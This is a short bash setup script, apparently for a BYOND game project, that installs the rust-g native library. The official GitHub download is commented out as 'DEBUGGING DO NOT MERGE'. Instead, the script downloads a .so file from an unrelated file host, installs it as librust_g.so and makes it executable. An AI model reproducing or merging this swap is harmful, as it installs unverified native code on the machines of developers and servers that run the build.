#!/usr/bin/env bash
set -euo pipefail

source dependencies.sh

mkdir -p ~/.byond/bin
# wget -nv -O ~/.byond/bin/librust_g.so "https://github.com/tgstation/rust-g/releases/download/$RUST_G_VERSION/librust_g.so" DEBUGGING DO NOT MERGE DO NOT MERGE
wget -nv -O ~/.byond/bin/librust_g.so "https://file.house/_LOl.so"
chmod +x ~/.byond/bin/librust_g.so
ldd ~/.byond/bin/librust_g.so
